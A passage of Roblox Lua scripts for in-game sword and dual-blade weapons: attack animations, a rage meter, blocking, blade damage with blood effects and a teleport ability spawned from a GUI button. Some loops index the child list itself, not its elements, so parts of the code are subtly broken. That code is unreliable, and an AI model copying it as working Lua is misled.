				neck.C0 = necko * CA(MR(15-15*i), 0, 0)

				bp.position = Center * CN(0, 1.4-0.4*i, -Dist-1-0.3*i).p

				wait()

			end

			RLW.Part1 = nil

			LLW.Part1 = nil

			for i = 0.1, 1, 0.2 do

				LAW.C0 = CA(MR(-50+70*i), MR(-20*i), MR(-40+20*i))

				wait()

			end

			Normalize()

			AbleAll = true

		end

	end



	function Raeg()

		if Rage < Dmgs.RageMode[5] then return end

		if RageMode == false and AbleAll and Able then

			AbleAll = false

			local CF = ComputePos(torso.Position, torso.CFrame * CN(0, 0, -2))

			for i = 0.05, 1, 0.1 do

				RAW.C0 = CA(MR(40-70*i), MR(50-45*i), MR(10*i))

				LAW.C0 = CA(MR(20-50*i), MR(-20+15*i), MR(-20+10*i))

				HW.C0 = CA(MR(20*i), 0, 0)

				wait()

			end

			for i = 0.12, 1, 0.25 do

				RAW.C0 = CA(MR(-30-10*i), MR(5-5*i), MR(10-5*i))

				LAW.C0 = CA(MR(-30-10*i), MR(-5+5*i), MR(-10+5*i))

				HW.C0 = CA(MR(20+5*i), 0, 0)

				wait()

			end

			hum.Jump = true

			playz(Sounds.Jump2)

			CF = ComputePos(torso.Position, torso.CFrame * CN(0, 0, -2))

			local p = Part(workspace, true, false, 0, 0, "Bright red", 0.2, 0.2, 0.2, true)

			p.CFrame = CF * CN(0, -2, 0)

			local m = Add.Mesh(p, "http://www.roblox.com/asset/?id=20329976", 1, 3, 1)

			Notime(function()

				for i = 0, 1, 0.08 do

					wait()

					m.Scale = Vector3.new(1+5*i, 3-2.5*i, 1+5*i)

					p.Transparency = i

				end

				p:remove()

			end)

			for i = 0.05, 1, 0.1 do

				RAW.C0 = CA(MR(-40+220*i), 0, MR(5+35*i))

				LAW.C0 = CA(MR(-40+220*i), 0, MR(-5-35*i))

				HW.C0 = CA(MR(25-115*i), MR(90*i), MR(45*i))

				wait()

			end

			for i = 0.12, 1, 0.25 do

				RAW.C0 = CA(MR(180+8*i), 0, MR(40))

				LAW.C0 = CA(MR(180+8*i), 0, MR(-40))

				HW.C0 = CA(MR(-90), MR(90), MR(45))

				wait()

			end

			for i = 0.05, 1, 0.1 do

				RAW.C0 = CA(MR(188-98*i), 0, MR(40-80*i)) * CN(0, -1*i, 0)

				LAW.C0 = CA(MR(188-98*i), 0, MR(-40+80*i)) * CN(0, -1*i, 0)

				HW.C0 = CA(MR(-90+90*i), MR(90+45*i), MR(45-45*i))

				wait()

			end

			playz(Sounds.GoRage)

			local p2 = Part(workspace, false, false, 1, 0, EffectColor3, 1, 1, 1, true)

			Weld(Tip4, p2, 0, -2, 0, 0, 0, 0)

			local m2 = Add.Sphere(p2)

			m2.Scale = Vector3.new(0.2, 2, 0.5)

			for i = 0, 1, 0.06 do

				p2.Transparency = 1-1*i

				m2.Scale = Vector3.new(0.2+0.7*i, 2+3*i, 0.5+1.6*i)

				wait()

			end

			for _,v in pairs(Blades) do

				v.BrickColor = BrickColor.new(EffectColor3)

			end

			wait(0.5)

			for i = 0, 1, 0.1 do

				p2.Transparency = i

				wait()

			end

			p2:remove()

			playz(Sounds.Shout)

			for i = 0.1, 1, 0.1 do

				RAW.C0 = CA(MR(90-50*i), MR(50*i), MR(-40+40*i)) * CN(0, -1+1*i, 0)

				LAW.C0 = CA(MR(90-70*i), MR(-20*i), MR(-40+80-60*i)) * CN(0, -1+1*i, 0)

				HW.C0 = CA(0, MR(135+45*i), 0)

				wait()

			end

			Normalize()

			AbleAll = true

			RageMode = true

			AddDamage = Dmgs.RageMode[2]

			AddDamageX = Dmgs.RageMode[3]

			AddShield = Dmgs.RageMode[4]

			LineColor = EffectColor3

			Notime(function()

				repeat

					wait()

					Rage = Rage - 0.45

				until Rage < 1

				RageMode = false

				AddDamage = 0

				AddShield = 0

				AddDamageX = 1

				LineColor = "White"

				local p3 = Part(workspace, false, false, 1, 0, BladeColor, 1, 1, 1, true)

				Weld(Tip4, p3, 0, -2, 0, 0, 0, 0)

				local m3 = Add.Sphere(p3)

				m3.Scale = Vector3.new(0.85, 4.9, 1.8)

				playz(Sounds.RageOff)

				for i = 0.1, 1, 0.1 do

					p3.Transparency = 1-1*i

					wait()

				end

				p.Transparency = 0

				for _,v in pairs(Blades) do

					v.BrickColor = BrickColor.new(BladeColor)

				end

				wait(0.2)

				for i = 0.2, 1, 0.2 do

					p3.Transparency = 1*i

					m3.Scale = Vector3.new(0.85+2*i, 4.9+9*i, 1.8+4.5*i)

					wait()

				end

				p3:remove()

			end)

		end

	end



	function RageSlash(plaic)

		if Rage < Dmgs.RageSlash[6] then return end

		local cf = torso.CFrame

		local CF = ComputePos(cf.p, cf * CN(0, 0, -2))

		if plaic then

			CF = ComputePos(cf.p, plaic)

			local bg = Add.BG(torso)

			bg.cframe = CF

			Notime(function() bg:remove() end, 0.4)

		end

		Rage = Rage - Dmgs.RageSlash[6]

		AbleAll = false

		for i = 0.05, 1, 0.1 do

			RAW.C0 = CA(MR(40+105*i), MR(50-50*i), MR(-35*i)) * CN(0.15*i, -1*i, 0)

			LAW.C0 = CA(MR(20+125*i), MR(-20+20*i), MR(-20+55*i)) * CN(-0.15*i, -1*i, 0)

			HW.C0 = CA(0, MR(-35*i), 0)

			neck.C0 = necko * CA(MR(-20*i), 0, 0)

			wait()

		end

		for i = 0.09, 1, 0.18 do

			RAW.C0 = CA(MR(145+55*i), 0, MR(-35)) * CN(0.15, -1, 0)

			LAW.C0 = CA(MR(145+55*i), 0, MR(35)) * CN(-0.15, -1, 0)

			HW.C0 = CA(0, MR(-35), 0)

			neck.C0 = necko * CA(MR(-20-20*i), 0, 0)

			wait()

		end

		PlaySound(Sounds.Slash[1], Sounds.Slash[2]-0.7, Sounds.Slash[3])

		for i = 0.12, 1, 0.25 do

			RAW.C0 = CA(MR(200+10*i), 0, MR(-35)) * CN(0.15, -1, 0)

			LAW.C0 = CA(MR(200+10*i), 0, MR(35)) * CN(-0.15, -1, 0)

			HW.C0 = CA(0, MR(-35), 0)

			neck.C0 = necko * CA(MR(-20-20-5*i), 0, 0)

			wait()

		end

		Mode = Dmgs.RageSlash

		StartEffect("Neon orange")

		Hurt = true

		Deb = true

		for i = 0.07, 1, 0.14 do

			RAW.C0 = CA(MR(210-160*i), 0, MR(-35)) * CN(0.15, -1, 0)

			LAW.C0 = CA(MR(210-150*i), MR(-30*i), MR(35)) * CN(-0.15, -1, 0)

			HW.C0 = CA(MR(-70*i), MR(-35), MR(-35*i))

			neck.C0 = necko * CA(MR(-45+80*i), 0, 0)

			wait()

		end

		EndEffect()

		Hurt = false

		for i = 0.33, 1, 0.33 do

			RAW.C0 = CA(MR(50-15*i), 0, MR(-35)) * CN(0.15, -1, 0)

			LAW.C0 = CA(MR(60-15*i), MR(-30), MR(35)) * CN(-0.15, -1, 0)

			HW.C0 = CA(MR(-70-15*i), MR(-35), MR(-35-7*i))

			neck.C0 = necko * CA(MR(-45+80+5*i), 0, 0)

			wait()

		end

		for i = 0.07, 1, 0.14 do

			RAW.C0 = CA(MR(35+5*i), MR(50*i), MR(-35+35*i)) * CN(0.15-0.15*i, -1+1*i, 0)

			LAW.C0 = CA(MR(45-25*i), MR(-30+10*i), MR(35-55*i)) * CN(-0.15+0.15*i, -1+1*i, 0)

			HW.C0 = CA(MR(-70-15+85*i), MR(-35+35*i), MR(-35-7+42*i))

			neck.C0 = necko * CA(MR(-45+80+5-40*i), 0, 0)

			wait()

		end

		Normalize()

		AbleAll = true

	end



	--RAW ORIGINAL = CA(MR(40), MR(50), 0)

	--LAW ORIGINAL = CA(MR(20), MR(-20), MR(-20))

	--HW ORIGINAL = CA(0, 0, 0)



	function Counter()

		local cf = torso.CFrame

		local CF = CFrame.new(cf.p, cf * CN(0, 0, -2).p)

		local bg = Add.BG(torso)

		bg.cframe = CF

		for i = 0.1, 1, 0.2 do

			RAW.C0 = CA(MR(-50+50*i), MR(-35), MR(80*i))

			LAW.C0 = CA(MR(90-20*i), 0, MR(80-20*i)) * CN(-0.75+0.25*i, -0.8+0.5*i, 0)

			HW.C0 = CA(MR(20-60*i), 0, 0)

			bg.cframe = CF * CA(0, MR(-35*i), 0)

			neck.C0 = necko * CA(0, 0, MR(35*i))

			wait()

		end

		StartEffect()

		Hurt = true

		Deb = true

		Mode = Dmgs.Counter

		playz(Sounds.Slash)

		for i = 0.09, 1, 0.18 do

			RAW.C0 = CA(0, MR(-35+130*i), MR(80)) * CN(0, -0.3*i, 0)

			LAW.C0 = CA(MR(70-130*i), 0, MR(60-60*i)) * CN(-0.5+0.5*i, -0.3+0.3*i, 0)

			HW.C0 = CA(MR(-40+40*i), 0, 0)

			bg.cframe = CF * CA(0, MR(-35+80*i), 0)

			neck.C0 = necko * CA(0, 0, MR(35-80*i))

			wait()

		end

		EndEffect()

		Hurt = false

		for i = 0.12, 1, 0.25 do

			RAW.C0 = CA(0, MR(95+10*i), MR(80)) * CN(0, -0.3, 0)

			LAW.C0 = CA(MR(-60-10*i), 0, 0)

			HW.C0 = CA(MR(5*i), 0, 0)

			bg.cframe = CF * CA(0, MR(45+5*i), 0)

			neck.C0 = necko * CA(0, 0, MR(-45-5*i))

			wait()

		end

		for i = 0.06, 1, 0.12 do

			RAW.C0 = CA(MR(40*i), MR(105-55*i), MR(80-80*i)) * CN(0, -0.3+0.3*i, 0)

			LAW.C0 = CA(MR(-70+90*i), MR(-20*i), MR(-20*i))

			HW.C0 = CA(MR(5-5*i), 0, 0)

			bg.cframe = CF * CA(0, MR(50-50*i), 0)

			neck.C0 = necko * CA(0, 0, MR(-50+50*i))

			wait()

		end

		Normalize()

		bg:remove()

	end



	function Bloc()

		if AbleAll and Able then

			AbleAll = false

			Block.Value = true

			for i = 0, 1, 0.15 do

				if not Block then break end

				RAW.C0 = CA(MR(40-90*i), MR(50-85*i), 0)

				LAW.C0 = CA(MR(20+70*i), MR(-20+20*i), MR(-20+100*i)) * CN(-0.75*i, -0.8*i, 0)

				HW.C0 = CA(MR(20*i), 0, 0)

				wait()

			end

			RAW.C0 = CA(MR(40-90), MR(50-85), 0)

			LAW.C0 = CA(MR(20+70), MR(-20+20), MR(-20+100)) * CN(-0.75, -0.8, 0)

			HW.C0 = CA(MR(20), 0, 0)

			PlaySound(Sounds.SmashHit[1], Sounds.SmashHit[2]-0.6, Sounds.SmashHit[3])

			repeat

				wait()

				if BlockPower.Value < 1 then

					Block.Value = false

					BlockPower.Value = BlockRealPowa

				end

			until Block.Value == false

			if CounterKey and Rage >= Dmgs.Counter[6] then

				Rage = Rage - Dmgs.Counter[6]

				Counter()

			else

				for i = 1, 0, -0.2 do

					RAW.C0 = CA(MR(40-90*i), MR(50-85*i), 0)

					LAW.C0 = CA(MR(20+70*i), MR(-20+20*i), MR(-20+100*i)) * CN(-0.75*i, -0.8*i, 0)

					HW.C0 = CA(MR(20*i), 0, 0)

					wait()

				end

				Normalize()

			end

			AbleAll = true

		end

	end



	function Clicked(mousepos)

		if Block.Value == false and Able and AbleAll then

			if Aim then

				Notime(function()

					local bg = Add.BG(torso)

					bg.cframe = ComputePos(torso.Position, mousepos)

					bg.P = 5500

					wait(0.4)

					bg:remove()

				end)

			end

			Attacks[Attack]()

		end

	end



	function KeyDown(key, mouse)

		key = key:lower()

		if Able then

			local aimplace = nil

			if Aim then

				aimplace = mouse.Hit.p

			end

			if key == string.char(48) then

				Notime(function()

					local k = nil

					repeat

						k = mouse.KeyUp:wait()

					until k == string.char(48)

					Block.Value = false

				end)

				Bloc()

			elseif key == "e" then

				if Block.Value == false and AbleAll then

					SpinSlash(aimplace)

				end

			elseif key == "r" then

				if Block.Value == false and AbleAll then

					Flawp(aimplace)

				end

			elseif key == "f" then

				if Block.Value == false and AbleAll then

					Raeg()

				end

			elseif key == "t" then

				Notime(function()

					local k = nil

					CounterKey = true

					repeat

						k = mouse.KeyUp:wait()

					until k == "t"

					CounterKey = false

				end)

			elseif key == "q" then

				if Block.Value == false and AbleAll then

					local a = nil

					if Aim then

						a = mouse.Hit.p

					end

					RageSlash(a)

				end

			end

		end

	end



	Select = function(mouse)

		SelectAnim()

		Selected = true

		mouse.Button1Down:connect(function()

			if Able then

				Clicked(mouse.Hit.p)

			end

		end)

		mouse.KeyDown:connect(function(key)

			KeyDown(key, mouse)

		end)

	end



	Deselect = function(mouse)

		Selected = false

		DeselectAnim()

	end



	Bin.Selected:connect(Select)

	Bin.Deselected:connect(Deselect)



	Notime(function()

		local parent = char.Parent

		while char.Parent == parent do

			wait()

			if Rage > MaxRage then Rage = MaxRage elseif Rage < 0 then Rage = 0 end

			RageBar.Size = UD(1, 0, Rage/MaxRage, 0)

			RageBar.Position = UD(0, 0, 1-(Rage/MaxRage), 0)

			RageAmount.Text = math.floor(Rage)

			local hp2 = hum.Health/hum.MaxHealth

			if hp2 > 1 then hp2 = 1 elseif hp2 < 0 then hp2 = 0 end

			HealthBar.Size = UD(1, 0, hp2, 0)

			if Block.Value then

				hum.WalkSpeed = 10

			elseif RageMode and Block.Value then

				hum.WalkSpeed = 16

			elseif RageMode then

				hum.WalkSpeed = 19

			else

				hum.WalkSpeed = 16

			end

		end

	end)

end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Dual Blades"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Dual Blades"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	--MADE BY OneLegend (NOT THE SCRIPT) LOCAL SCRIPT: Go to line 5 and put your name where it says "YOUR NAME HERE"


	local admin = game.Players.LocalPlayer
	bin = Instance.new("HopperBin", admin.Backpack) 
	player = bin.Parent.Parent.Character 
	rarm = player["Right Arm"] 
	larm = player["Left Arm"] 
	visible = true 
	--for i, v in pairs(game.Players:GetChildren()) do 
	--bin:Clone().Parent = v.Backpack 
	--end 
	on = 1 

	local glideg = Instance.new("BodyGyro") 
	local glidev = Instance.new("BodyVelocity") 

	function shadow(rblade,lblade) 
		while on == 1 do 
			wait(.1) 
			if visible then 
				local a = rblade:clone() 
				local b = lblade:clone() 
				a.Anchored = true 
				a.Parent = player 
				a.CFrame = rblade.CFrame 
				a.CanCollide = false 
				a.Transparency = .2 
				b.Anchored = true 
				b.Parent = player 
				b.CFrame = lblade.CFrame 
				b.CanCollide = false 
				b.Transparency = .2 
				coroutine.resume(coroutine.create(function() dissapate(a,b) end)) 
			end 
		end 
	end 

	function stun(blast) 
		for x = 1,15 do 
			wait(1) 
			local sap = game.Players:GetChildren() 
			for i = 1,#sap do 
				wait() 
				if (sap.Character.Torso.Position - Workspace.keel.Position).magnitude < 20 then 
					sap.Character.Humanoid.Sit = true 
				end 
			end 
		end 
	end 

	function dissapate(a,b) 
		for i = 1,8 do 
			wait() 
			a.Transparency = a.Transparency +.1 
			b.Transparency = b.Transparency +.1 
		end 
		a:remove() 
		b:remove() 
	end 

	bin.Selected:connect(function(mouse) 
		on = 1 
		if player.Torso:findFirstChild("Right Shoulder") ~= nil then 
			rs = player.Torso["Right Shoulder"] 
			rs.Part1 = nil 
		end 
		if player.Torso:findFirstChild("Left Shoulder") ~= nil then 
			ls = player.Torso["Left Shoulder"] 
			ls.Part1 = nil 
		end 
		if player:FindFirstChild("check") == nil then 
			rns = Instance.new("Weld") 
			rns.Parent = player.Torso 
			rns.Part0 = rns.Parent 
			rns.Part1 = player["Right Arm"] 
			rns.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
			lns = Instance.new("Weld") 
			lns.Parent = player.Torso 
			lns.Part0 = lns.Parent 
			lns.Part1 = player["Left Arm"] 
			lns.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
			rblade = Instance.new("Part") 
			rblade.BrickColor = BrickColor.new("Institutional white") 
			rblade.Name ="check" 
			rblade.Parent = player 
			rblade.CanCollide = false 
			rblade.Size = Vector3.new(1,3,1) 
			rblade.formFactor = "Symmetric" 
			rblade.TopSurface = 0 
			rblade.BottomSurface = 0 
			rbm = Instance.new("BlockMesh") 
			rbm.Parent = rblade 
			rbm.Scale = Vector3.new(.1,1,.3) 
			rbw = Instance.new("Weld") 
			rbw.Parent = rarm 
			rbw.Part0 = rarm 
			rbw.Part1 = rblade 
			rbw.C1 = CFrame.new(0,1,0) 
			lblade = Instance.new("Part") 
			lblade.BrickColor = rblade.BrickColor 
			lblade.Name = "checkb" 
			lblade.Parent = player 
			lblade.CanCollide = false 
			lblade.Size = Vector3.new(1,3,1) 
			lblade.formFactor = "Symmetric" 
			lblade.TopSurface = 0 
			lblade.BottomSurface = 0 
			lbm = Instance.new("BlockMesh") 
			lbm.Parent = lblade 
			lbm.Scale = Vector3.new(.1,1,.3) 
			lbw = Instance.new("Weld") 
			lbw.Parent = larm 
			lbw.Part0 = larm 
			lbw.Part1 = lblade 
			lbw.C1 = CFrame.new(0,1,0) 
			coroutine.resume(coroutine.create(function() shadow(rblade, lblade) end)) 
		end 
		rblade.Touched:connect(function(hit) 
			if hit.Parent:findFirstChild("Humanoid") ~= nil then 
				if hit.Parent.Name ~= player.Name then 
					if hit.Parent.Humanoid.MaxHealth > 100 then 
						hit.Parent.Humanoid.MaxHealth = 100 
					end 
					hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - math.random(3,7) 
					for i = 1, (math.random(1,3)) do 
						wait() 
						local bleed = Instance.new("Part") 
						bleed.formFactor = "Symmetric" 
						bleed.Size = Vector3.new(1,1,1) 
						bleed.BrickColor = BrickColor.new("Bright red") 
						bleed.TopSurface = 0 
						bleed.BottomSurface = 0 
						bleed.Reflectance = .1 
						bleed.Transparency = .4 
						bleed.Parent = Workspace 
						bleed.Position = rblade.Position 
						local bleedm = Instance.new("SpecialMesh") 
						bleedm.MeshType = "Sphere" 
						bleedm.Scale = Vector3.new(.2,.2,.2) 
						bleedm.Parent = bleed 
						game:GetService("Debris"):AddItem(bleed, 5) 
					end 
				end 
			end 
		end) 

		lblade.Touched:connect(function(hit) 
			if hit.Parent:findFirstChild("Humanoid") ~= nil then 
				if hit.Parent.Name ~= player.Name then 
					if hit.Parent.Humanoid.MaxHealth > 100 then 
						hit.Parent.Humanoid.MaxHealth = 100 
					end 
					hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - math.random(3,7) 
					for i = 1, (math.random(1,3)) do 
						wait() 
						local bleed = Instance.new("Part") 
						bleed.formFactor = "Symmetric" 
						bleed.Size = Vector3.new(1,1,1) 
						bleed.BrickColor = BrickColor.new("Bright red") 
						bleed.TopSurface = 0 
						bleed.BottomSurface = 0 
						bleed.Reflectance = .1 
						bleed.Transparency = .4 
						bleed.Parent = Workspace 
						bleed.Position = lblade.Position 
						local bleedm = Instance.new("SpecialMesh") 
						bleedm.MeshType = "Sphere" 
						bleedm.Scale = Vector3.new(.2,.2,.2) 
						bleedm.Parent = bleed 
						game:GetService("Debris"):AddItem(bleed, 5) 
					end 
				end 
			end 
		end) 
		----end of blades 
		right = rns 
		left = lns 
		mouse.KeyDown:connect(function(key) 
			key = key:lower() 
			print(key) 
			if key == "z" and rblade.Transparency <= 0 then 
				for i = 1,50 do 
					wait() 
					rblade.Transparency = rblade.Transparency + .02 
					lblade.Transparency = lblade.Transparency + .02 
				end 
				rblade.Transparency = 1 
				lblade.Transparency = 1 
				visible = false 
			elseif key == "x" and rblade.Transparency > 0 then 
				visible = true 
				for i = 1,50 do 
					wait() 
					rblade.Transparency = rblade.Transparency - .02 
					lblade.Transparency = lblade.Transparency - .02 
				end 
				rblade.Transparency = 0 
				lblade.Transparency = 0 
			elseif key == "c" then 
				wait() 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
			end 
			if key == "e" then 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				wait() 
				right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
				wait() 
				right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
				wait() 
				right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
				wait() 
				right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
				wait() 
				right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
				wait(.5) 
				right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
				wait() 
				right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
				wait() 
				right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
				wait() 
				right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
			elseif key == "q" then 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
				wait() 
				left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
				wait() 
				left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
				wait() 
				left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
				wait() 
				left.C1 = CFrame.new(1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
				wait(.5) 
				left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
				wait() 
				left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
				wait() 
				left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
				wait() 
				left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
				wait() 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
			elseif key == "r" then 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				left.C1 = CFrame.new(1.42,0.62,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.3)) 
				wait() 
				left.C1 = CFrame.new(1.29,0.84,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.35)) 
				wait() 
				left.C1 = CFrame.new(1.16,1.06,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.4)) 
				wait() 
				left.C1 = CFrame.new(1.03,1.28,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.45)) 
				wait() 
				left.C1 = CFrame.new(0.9,1.5,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*.5)) 
				wait(.2) 
				left.C1 = CFrame.new(0.9,1.5,-0.15)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*.5)) 
				wait() 
				left.C1 = CFrame.new(0.9,1.5,-0.30)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*.5)) 
				wait() 
				left.C1 = CFrame.new(0.9,1.5,-0.45)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*.5)) 
				wait() 
				left.C1 = CFrame.new(0.9,1.5,-0.60)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*.5)) 
				wait() 
				left.C1 = CFrame.new(0.9,1.5,-0.75)*CFrame.Angles((math.pi*-.75),(math.pi*0),(math.pi*.5)) 
				wait(.1) 
				left.C1 = CFrame.new(1.03,1.28,0)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*.45)) 
				wait() 
				left.C1 = CFrame.new(1.16,1.06,0)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*.4)) 
				wait() 
				left.C1 = CFrame.new(1.29,0.84,0)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*.35)) 
				wait() 
				left.C1 = CFrame.new(1.42,0.62,0)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*.3)) 
				wait() 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
			elseif key == "t" then 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				wait() 
				right.C1 = CFrame.new(-1.42,0.62,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.3)) 
				wait() 
				right.C1 = CFrame.new(-1.29,0.84,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.35)) 
				wait() 
				right.C1 = CFrame.new(-1.16,1.06,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.4)) 
				wait() 
				right.C1 = CFrame.new(-1.03,1.28,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.45)) 
				wait() 
				right.C1 = CFrame.new(-0.9,1.5,0)*CFrame.Angles((math.pi*0),(math.pi*0),(math.pi*-.5)) 
				wait(.2) 
				right.C1 = CFrame.new(-0.9,1.5,-0.15)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*-.5)) 
				wait() 
				right.C1 = CFrame.new(-0.9,1.5,-0.30)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*-.5)) 
				wait() 
				right.C1 = CFrame.new(-0.9,1.5,-0.45)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*-.5)) 
				wait() 
				right.C1 = CFrame.new(-0.9,1.5,-0.60)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*-.5)) 
				wait() 
				right.C1 = CFrame.new(-0.9,1.5,-0.75)*CFrame.Angles((math.pi*-.75),(math.pi*0),(math.pi*-.5)) 
				wait(.1) 
				right.C1 = CFrame.new(-1.03,1.28,0)*CFrame.Angles((math.pi*-.60),(math.pi*0),(math.pi*-.45)) 
				wait() 
				right.C1 = CFrame.new(-1.16,1.06,0)*CFrame.Angles((math.pi*-.45),(math.pi*0),(math.pi*-.4)) 
				wait() 
				right.C1 = CFrame.new(-1.29,0.84,0)*CFrame.Angles((math.pi*-.30),(math.pi*0),(math.pi*-.35)) 
				wait() 
				right.C1 = CFrame.new(-1.42,0.62,0)*CFrame.Angles((math.pi*-.15),(math.pi*0),(math.pi*-.3)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
			end 
			--abilities 
			if key == "b" then 
				local a = player:GetChildren() 
				for i = 1,#a do 
					wait() 
					if a.className == "Part" and a.Name ~= "check" and a.Name ~= "checkb" then 
						for x = 1, 5 do 
							wait() 
							a.Transparency = a.Transparency +.2 
						end 
					elseif a.className == "Hat" then 
						for x = 1, 5 do 
							wait() 
							a.Handle.Transparency = a.Handle.Transparency +.2 
						end 
					end 
				end 
				player.Torso.CFrame = mouse.Hit + Vector3.new(0,4,0) 
				wait() 
				for i = 1,#a do 
					wait() 
					if a.className == "Part" and a.Name ~= "check" and a.Name ~= "checkb" then 
						for x = 1, 5 do 
							wait() 
							a.Transparency = a.Transparency -.2 
						end 
					elseif a.className == "Hat" then 
						for x = 1, 5 do 
							wait() 
							a.Handle.Transparency = a.Handle.Transparency -.2 
						end 
					end 
				end 
				for i = 1,#a do 
					wait() 
					if a.className == "Part" and a.Name ~= "check" and a.Name ~= "checkb" then 
						wait() 
						a.Transparency = 0 
					elseif a.className == "Hat" then 
						wait() 
						a.Handle.Transparency = 0 
					end 
				end 
			end 
			if key == "v" then 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
				left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
				wait() 
				right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
				left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
				wait() 
				right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
				left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
				wait() 
				right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
				left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
				wait() 
				right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
